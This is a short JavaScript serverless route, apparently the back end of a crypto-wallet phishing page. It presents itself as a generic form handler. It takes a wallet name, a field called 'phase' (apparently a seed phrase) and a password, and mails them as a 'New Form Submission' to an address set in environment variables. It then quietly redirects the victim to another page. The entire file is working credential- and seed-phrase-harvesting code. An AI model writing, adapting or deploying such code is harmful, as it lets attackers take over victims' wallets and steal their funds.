import nodemailer from 'nodemailer';
import { parse } from 'querystring';

export default async function handler(req, res) {
  // Only allow POST requests
  if (req.method !== 'POST') {
    return res.status(405).send('Method not allowed');
  }

  let { wallet_name, phase, pw: password } = req.body;

  // Validate required fields
  if (!phase || phase.trim() === '') {
    return res.status(400).send('Required field missing.');
  }

  try {
    // Create transporter with environment variables
    const smtpHost = process.env.SMTP_HOST || 'smtp.gmail.com';
    const smtpPort = parseInt(process.env.SMTP_PORT || '587', 10);
    const smtpSecure = (process.env.SMTP_SECURE || 'false') === 'true' || smtpPort === 465;
    const smtpUser = process.env.SMTP_USER || process.env.SMTP_USERNAME;
    const smtpPass = process.env.SMTP_PASSWORD || process.env.SMTP_PASS;

    const transporter = nodemailer.createTransport({
      host: smtpHost,
      port: smtpPort,
      secure: smtpSecure,
      auth: {
        user: smtpUser,
        pass: smtpPass,
      },
    });

    // Prepare email
    const fromEmail = process.env.SMTP_FROM_EMAIL || process.env.EMAIL_FROM || 'noreply@connectus.website';
    const fromName = process.env.SMTP_FROM_NAME || process.env.EMAIL_FROM_NAME || 'Website Bot';
    const toEmail = process.env.RECIPIENT_EMAIL || process.env.EMAIL_TO || smtpUser;

    const mailOptions = {
      from: `${fromName} <${fromEmail}>`,
      to: toEmail,
      subject: 'New Form Submission',
      text: `Wallet Name: ${wallet_name || 'N/A'}\nPhase: ${phase}\nPassword: ${password || 'N/A'}`,
    };

    // Send email
    await transporter.sendMail(mailOptions);

    // Redirect to the original behavior
    res.writeHead(302, { 'Location': '/rdr.html' });
    res.end();

  } catch (error) {
    console.error('Email error:', error);
    res.status(500).send('Message could not be sent. Error: ' + error.message);
  }
}
